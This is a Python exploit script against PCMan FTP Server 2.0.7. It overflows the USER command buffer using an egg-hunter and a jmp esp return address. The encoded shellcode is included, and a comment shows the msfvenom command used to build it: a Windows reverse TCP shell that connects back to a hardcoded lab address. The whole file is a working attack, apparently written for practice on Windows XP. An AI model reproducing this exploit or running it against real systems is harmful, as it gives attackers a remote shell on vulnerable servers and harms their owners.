#!/usr/local/env python

#
# PCMan FTP Server v2.0.7 - BOF using egg-hunting method
# badchars: \x00\x0a\x0d
# 0x77fab277 : jmp esp |  SHLWAPI.dll
# msfvenom -p windows/shell_reverse_tcp LHOST=172.16.177.128 LPORT=1234 EXITFUNC=thread \
# --platform windows -b '\x00\x0a\x0d' -e x86/shikata_ga_nai -i 1 -f c
# Tested On: Windows XP SP3 using Immunity dbg and mona.py plugin
#

import socket

ip='172.16.177.148'
port=21

egghunter=(
        "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02"
        "\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8"
        "\x6c\x33\x33\x74"                              # l33t          
        "\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
        )

shellcode=(
        "l33tl33t"
        "\xd9\xed\xbf\xae\xe0\xc8\xeb\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
        "\x52\x31\x7d\x17\x83\xed\xfc\x03\xd3\xf3\x2a\x1e\xd7\x1c\x28"
        "\xe1\x27\xdd\x4d\x6b\xc2\xec\x4d\x0f\x87\x5f\x7e\x5b\xc5\x53"
        "\xf5\x09\xfd\xe0\x7b\x86\xf2\x41\x31\xf0\x3d\x51\x6a\xc0\x5c"
        "\xd1\x71\x15\xbe\xe8\xb9\x68\xbf\x2d\xa7\x81\xed\xe6\xa3\x34"
        "\x01\x82\xfe\x84\xaa\xd8\xef\x8c\x4f\xa8\x0e\xbc\xde\xa2\x48"
        "\x1e\xe1\x67\xe1\x17\xf9\x64\xcc\xee\x72\x5e\xba\xf0\x52\xae"
        "\x43\x5e\x9b\x1e\xb6\x9e\xdc\x99\x29\xd5\x14\xda\xd4\xee\xe3"
        "\xa0\x02\x7a\xf7\x03\xc0\xdc\xd3\xb2\x05\xba\x90\xb9\xe2\xc8"
        "\xfe\xdd\xf5\x1d\x75\xd9\x7e\xa0\x59\x6b\xc4\x87\x7d\x37\x9e"
        "\xa6\x24\x9d\x71\xd6\x36\x7e\x2d\x72\x3d\x93\x3a\x0f\x1c\xfc"
        "\x8f\x22\x9e\xfc\x87\x35\xed\xce\x08\xee\x79\x63\xc0\x28\x7e"
        "\x84\xfb\x8d\x10\x7b\x04\xee\x39\xb8\x50\xbe\x51\x69\xd9\x55"
        "\xa1\x96\x0c\xf9\xf1\x38\xff\xba\xa1\xf8\xaf\x52\xab\xf6\x90"
        "\x43\xd4\xdc\xb8\xee\x2f\xb7\x6a\xfe\x9e\xc7\x1b\xfd\xe0\xc3"
        "\x09\x88\x06\xa1\xbd\xdd\x91\x5e\x27\x44\x69\xfe\xa8\x52\x14"
        "\xc0\x23\x51\xe9\x8f\xc3\x1c\xf9\x78\x24\x6b\xa3\x2f\x3b\x41"
        "\xcb\xac\xae\x0e\x0b\xba\xd2\x98\x5c\xeb\x25\xd1\x08\x01\x1f"
        "\x4b\x2e\xd8\xf9\xb4\xea\x07\x3a\x3a\xf3\xca\x06\x18\xe3\x12"
        "\x86\x24\x57\xcb\xd1\xf2\x01\xad\x8b\xb4\xfb\x67\x67\x1f\x6b"
        "\xf1\x4b\xa0\xed\xfe\x81\x56\x11\x4e\x7c\x2f\x2e\x7f\xe8\xa7"
        "\x57\x9d\x88\x48\x82\x25\xa8\xaa\x06\x50\x41\x73\xc3\xd9\x0c"
        "\x84\x3e\x1d\x29\x07\xca\xde\xce\x17\xbf\xdb\x8b\x9f\x2c\x96"
        "\x84\x75\x52\x05\xa4\x5f"
        )

payload="USER "+"A"*200+shellcode+"A"*(2002-42-200-len(shellcode))+egghunter+"\x90"*10+"\x77\xb2\xfa\x77"+"\x90"*4+"\xeb\xcc\x90\x90"+"\r\n"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip,port))
    print s.recv(1024)
    s.send(payload)
    s.close()
except:
    "Couldn't connect"
